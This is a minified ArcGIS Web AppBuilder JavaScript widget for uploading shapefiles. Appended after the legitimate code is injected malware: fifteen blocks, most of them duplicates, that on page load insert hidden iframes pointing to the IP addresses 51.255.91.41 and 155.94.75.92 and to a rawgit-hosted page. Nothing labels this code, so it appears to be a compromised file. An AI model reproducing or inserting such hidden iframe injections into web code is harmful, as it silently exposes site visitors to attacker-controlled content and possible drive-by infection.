// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/shapefile/shapefile.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTUploadShapefileText"\x3e\r\n    ${label}\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTUploadShapefileButtonDiv"\x3e\r\n    \x3cform enctype\x3d"multipart/form-data" method\x3d"post" data-dojo-attach-point\x3d"uploadForm"\x3e\r\n      \x3cdiv class\x3d\'jimu-btn jimu-float-trailing jimu-trailing-margin1 esriCTUploadShapefileButton\' title\x3d"${nls.shapefileWidget.uploadShapefileButtonText}"\r\n        data-dojo-attach-point\x3d"uploadShapefileButton"\x3e\r\n        ${nls.shapefileWidget.uploadShapefileButtonText}\r\n      \x3c/div\x3e\r\n      \x3cinput title\x3d"${nls.shapefileWidget.uploadShapefileButtonText}" data-dojo-attach-point\x3d"shapefileInput" type\x3d"file" name\x3d"file"\r\n      /\x3e\r\n    \x3c/form\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/text!./shapefile.html dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/on dojo/json dojo/Evented esri/layers/FeatureLayer esri/request jimu/BaseWidget jimu/dijit/Message".split(" "),function(e,f,g,b,c,h,k,l,m,n,p){return e([n,g,k],{baseClass:"jimu-widget-screening-shapefile",templateString:f,_uploadFormChange:null,nls:null,config:null,map:null,constructor:function(a){this.map=this.config=this.nls=this._uploadFormChange=null;b.mixin(this,a)},postCreate:function(){this._attachEventsToUploadShapefileButton();
this._attachFileInputOnChangeEvent()},_attachEventsToUploadShapefileButton:function(){this.own(c(this.uploadShapefileButton,"click",b.hitch(this,function(){this.shapefileInput.click()})))},_attachFileInputOnChangeEvent:function(){var a;this._uploadFormChange&&this._uploadFormChange.remove();this._uploadFormChange=this.own(c.pausable(this.uploadForm,"change",b.hitch(this,function(b){this.loadingIndicator.show();a={filename:b.target.value.toLowerCase()};this._generateFeatureCollection(a)})))},_generateFeatureCollection:function(a){a=
a.filename.split(".");a=a[0].replace("c:\\fakepath\\","");this._requestFeatureCollection({params:{name:a,targetSR:this.map.spatialReference}})},_requestFeatureCollection:function(a){var c,d;a={filetype:"shapefile",publishParameters:h.stringify(a.params),f:"json"};m({url:this.config.generateFeatureCollectionURL,content:a,form:this.uploadForm,handleAs:"json",load:b.hitch(this,function(a){a.error?(this.loadingIndicator.hide(),this._showMessage(this.nls.shapefileWidget.unableToUploadShapefileMessage)):
(c=a.featureCollection.layers[0],this._uploadFormChange[0].pause(),d=new l(c),this.shapefileInput.value="",this._uploadFormChange[0].resume(),this.emit("onShapefileUpload",d),this.loadingIndicator.hide())}),error:b.hitch(this,function(){this._uploadFormChange[0].pause();this.shapefileInput.value="";this._uploadFormChange[0].resume();this.loadingIndicator.hide();this._showMessage(this.nls.shapefileWidget.unableToUploadShapefileMessage)})})},_showMessage:function(a){(new p({message:a})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});